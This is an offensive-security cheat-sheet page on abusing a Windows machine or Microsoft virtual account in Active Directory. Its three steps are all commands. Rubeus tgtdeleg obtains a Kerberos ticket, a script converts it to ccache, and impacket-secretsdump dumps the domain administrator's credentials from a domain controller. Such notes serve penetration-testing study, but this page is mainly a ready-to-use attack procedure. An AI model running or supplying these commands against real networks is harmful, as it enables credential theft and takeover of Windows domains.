---
title: "Machine Account"
date: 2024-8-1
tags: ["machine account", "Microsoft virtual account", "active directory", "ad", "domain controller", "Windows", "rubeus", "kerberos"]
---

---
### Abuse #1: Microsoft virtual account

#### 1. Create a ticket from Microsoft virtual account

```powershell
.\rubeus.exe tgtdeleg /nowrap
```

#### 2. Convert kirbi to ccache (Back to Linux)

[RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)

```bash
python3 rubeustoccache.py <BASE64_TICKET> secrets.kirbi secrets.ccache
```

#### 3. Secrets Dump

```bash
export KRB5CCNAME=secrets.ccache
```

```bash
sudo ntpdate -s <DC> && impacket-secretsdump -k -no-pass -just-dc-user administrator
```

<br>